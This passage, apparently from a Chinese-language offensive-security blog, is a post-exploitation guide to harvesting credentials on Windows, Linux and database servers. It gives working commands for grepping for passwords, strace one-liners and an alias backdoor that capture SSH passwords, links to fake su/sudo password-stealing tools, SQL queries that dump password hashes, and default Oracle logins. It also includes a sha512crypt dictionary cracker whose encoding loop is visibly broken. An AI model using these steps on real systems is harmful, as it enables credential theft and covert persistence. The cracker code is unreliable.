```
### 6.2 回收站分析
```cmd
# cmd.exe
# 获得所有被删文件
FOR /f "skip=1 tokens=1,2 delims= " %c in ('wmic useraccount get name^,sid') do dir /a /b C:\$Recycle.Bin\%d\ >%c.txt
# 恢复出真实的被删文件的名称
PowerShell -Command  "$Recycler =(New-Object -ComObject Shell.Application).NameSpace(0xa);foreach($file in $Recycler.items()){echo "---------------------";$file.path;$file.ExtendedProperty(\"{9B174B33-40FF-11D2-A27E-00C04FC30871} 2\")+'\'+$file.name}"
```
![2021-07-09_173955](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-07-09_173955.jpg)
### 6.3 Notepad++
notepad有一目录会存储异常关闭时的临时文件，这些文件涉及到使用者的日常操作，可能含有一些敏感数据。
```shell
C:\Users\\AppData\Roaming\Notepad++\backup
```
# Linux
Linux的特点（功能较单一、命令接口丰富）注定了在它上面做敏感数据的搜索与发现相比较而言更为容易。
## 1 历史记录
```shell
# /root/ 及 /home/*/
.bash_history
.zsh_history
.mysql_history
.redis_history
```
历史记录中重点关注：
1.有没有直接给出账户名及密码的命令。
2.有没有远程其他设备的操作。（如果有我们可以试着远程，看看有没有配上免密登录）
3.有没有比较敏感的涉及数据备份之类的操作。
## 2 各类凭据
```shell
# 密码搜集
grep -rn "passw" -a / | grep -v "php\|jsp\|\.js\|\|.java"
grep -rn "passw" -a / | grep -v "ini\|conf"
find / -name *.properties -o -name *.xml -o -name *.conf -o -name *.json -exec grep -Hn "passw" {} \;
```
## 3 口令窃取
实际场景下应用较少，口令窃取需要有正常运维账户进行交互，这一过程中稍有不注意，极易被发现。
### 3.1 fakesu、fakesudo、fakepasswd
写了三套fake工具，利用PATH优先级劫持正常运维输入命令时的执行流程
https://github.com/aplyc1a/toolkits/tree/master/0x04 持久化/Linux/口令窃取后门/fake_su
https://github.com/aplyc1a/toolkits/tree/master/0x04 持久化/Linux/口令窃取后门/fake_sudo
https://github.com/aplyc1a/toolkits/tree/master/0x04 持久化/Linux/口令窃取后门/fake_passwd
### 3.2 键盘记录器
大部分键盘记录器只对带有GUI界面的Linux有效并且要求输入文本要在图形化页面里。实际中，对Linux部键盘记录器很少见。
### 3.3 strace后门
使用strace可以偷取SSH密码。具体可分两种情况：
一种时监听系统内sshd服务收到的所有流量，从中可以提取到密码信息。
另一种是通过alias后门、hash后门、PATH优先级等方式结合strace劫持系统内的ssh命令，从中可以提取到密码信息。为了实现持久化，会将劫持命令持久化到/etc/profile、/etc/bashrc等文件中。
#### 3.3.1 strace-sshd
这是上面提到的第一种后门。常见的命令如下。
```shell
(strace -f -F -P `ps aux|grep "sshd -D"|grep -v grep|awk '{print $2}'` -t -e trace=read,write -s 32 > /tmp/.sshd.log 2>&1 & )
```
记录量往往很大，可以grep一下。
```shell
grep -E 'read\(6,".+\\0\\0\\0\\.+")' /tmp/.sshd.log
```
#### 3.3.2 strace-ssh
如下面一个alias后门。或将strace命令写入shell脚本进而部署成hash后门或PATH优先级后门。
```shell
alias ssh='strace -o /tmp/sshwd-`date '+%d%h%m%s'`.log -e read -s2048 ssh'
```
### 3.4 OpenSSH后门
专门写了一篇[OpenSSH后门制作](https://github.com/aplyc1a/blogs/blob/master/OpenSSH后门制作.md)，使用定制化的OpenSSH后门，其稳定性与隐蔽性较前面的方案都高。
## 4 凭据破解
Linux下的凭据破解主要针对/etc/shadow，网上有很多现成的脚本，当然也可以放到cmd5.com上试着查查。下面是[网上的某python3爆破脚本](https://www.cnblogs.com/Cl0ud/p/14382258.html?ivk_sa=1024320u)。
```python
import hashlib,math
def rstr_sha512(text: bytes) -> bytes:
    sha512 = hashlib.sha512()
    sha512.update(text)
    return sha512.digest()
def _extend(source: bytes, size_ref: int) -> bytes :
    extended = b""
    for i in range(math.floor(size_ref/64)):
        extended += source
    extended += source[:size_ref % 64]
    return extended
def _sha512crypt_intermediate(password: bytes,salt: bytes) -> bytes:
    #digest_a = rstr_sha512(password + salt)
    digest_b = rstr_sha512(password + salt + password)
    digest_b_extended = _extend(digest_b,len(password))
    intermediate_input = password + salt + digest_b_extended
    passwd_len = len(password)
    while passwd_len!=0:
        if passwd_len&1 == 1:
            intermediate_input += digest_b
        else:
            intermediate_input += password
        passwd_len >>= 1
    return rstr_sha512(intermediate_input)
def _sha512crypt(password :bytes,salt :bytes,rounds :int) -> bytes:
    digest_a = _sha512crypt_intermediate(password, salt)
    p = _extend(rstr_sha512(password*len(password)),len(password))
    s = _extend(rstr_sha512(salt*(16+digest_a[0])),len(salt))
    digest = digest_a
    for i in range(rounds):
        c_input = b""
        if i&1 :
            c_input += p
        else:
            c_input += digest
        if i % 3:
            c_input += s
        if i % 7:
            c_input += p
        if i & 1:
            c_input += digest
        else:
            c_input += p
        digest = rstr_sha512(c_input)
    return digest
def sha512crypt(password :bytes,salt :bytes, rounds=5000) -> str:
    salt = salt[:16] # max 16 bytes for salt
    input = _sha512crypt(password, salt, rounds)
    tab = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    order = [ 42, 21, 0,  1,  43, 22, 23, 2,  44, 45, 24, 3,
              4,  46, 25, 26, 5,  47, 48, 27, 6, 7,  49, 28,
              29, 8,  50, 51, 30, 9, 10, 52, 31, 32, 11, 53,
              54, 33, 12, 13, 55, 34, 35, 14, 56, 57, 36, 15,
              16, 58, 37, 38, 17, 59, 60, 39, 18, 19, 61, 40,
              41, 20, 62, 63]
    output = ""
    for i in range(0,len(input),3):
        # special case for the end of the input
        if i+1 >= len(order): # i == 63
            char_1 = input[order[i+0]] & 0b00111111
            char_2 = (input[order[i+0]] & 0b11000000) >> 6
            output += tab[char_1] + tab[char_2]
        else:
            char_1 = input[order[i+0]] & 0b00111111
            char_2 = (((input[order[i+0]] & 0b11000000) >> 6) |
                       (input[order[i+1]] & 0b00001111) > 4) | 
                    (input[order[i+2]] & 0b00000011) > 2
            output += tab[char_1] + tab[char_2] + tab[char_3] + tab[char_4]
    if rounds!=5000:
        return "$6$rounds={}${}${}".format(rounds,salt.decode("utf-8"),output)
    else:
        return "$6${}${}".format(salt.decode("utf-8"),output)
def testPass(cryptPass):
    salt,shadowPass=cryptPass.split('$')[2],cryptPass.split('$')[3]
    dictFile=open('dictionary.txt','r')
    for word in dictFile.readlines():
        word=word.strip()
        # print(word)
        tempPassWord=sha512crypt(bytes(word, encoding = "utf8"), bytes(salt, encoding = "utf8"), 5000)
        # print("temppassword is {}".format(tempPassWord))
        # print("shadowpassword is {}".format(shadowPass))
        if cryptPass==tempPassWord:
            print("[+] Found Password {}".format(word))
            return
    print("[-] Password Not Found ")
    return
def main():
    passFile=open('passwords.txt')
    for line in passFile.readlines():
        if ":" in line:
            user=line.split(':')[0]
            cryptPass=line.split(':')[1].strip(' ')
            print("[*] Now cracking Password For :{}".format(user))
            testPass(cryptPass)
if __name__ == "__main__":
    #  与crypt.crypt("123456","$6$123456") 运算结果一致
    # print(sha512crypt(b"123",b"DhlRUwqV",5000))
    main()
```
## 5 docker挖掘
查看系统内有无docker镜像或已启动的docker容器。
```shell
docker images
docker ps
```
如果有可以打开docker，翻阅内部有无敏感数据。具体拉起docker的命令可能不同镜像有差别，可以参考历史记录内的docker相关操作。
```shell
#启动
docker run -it ****
#进入
docker exec -it **** /bin/bash
```
进入docker内可以重点关注web服务的配置文件，查看诸如数据库的连接口令及访问方式，redis地址信息等。
# 数据库内数据搜集
## 1 翻找密码
```mysql
/*MySQL数据库内找密码*/
SELECT TABLE_NAME FROM `information_schema`.`COLUMNS` where `COLUMN_NAME` like '%pass%';
SELECT TABLE_NAME FROM `information_schema`.`COLUMNS` where `COLUMN_NAME` like '%pwd%';
```
https://mp.weixin.qq.com/s/vRZOUOnDRCagr8IgUehIlg
## 2 数据库特权账户口令
### 2.1 MySQL
```shell
#select * from mysql.user;
select host,user,authentication_string from mysql.user;
select host,user,password from mysql.user;
```
### 2.2 MSSQL
这部分参考网文。
https://mp.weixin.qq.com/s/vRZOUOnDRCagr8IgUehIlg
```shell
# MSSQL 2000
select name,password from master.dbo.sysxlogins 
select master.dbo.fn_varbintohexstr(password) from master.dbo.sysxlogins where name='sa'
# MSSQL 2005
select name,password_hash from sys.sql_logins
# MSSQL 2008R2
Select name,password_hash from sys.sql_logins where name = 'sa'
# MSSQL 2012R2
select name,password_hash from sys.sql_logins
# MSSQL 2016
select name,password_hash from sys.sql_logins 
```
### 2.3 Oracle
Oracle有三个默认账户:
sys:change_on_install
system:manager
scott:tiger
可以登上数据库后输入以下命令查看
```shell
select username,password from dba_users;
```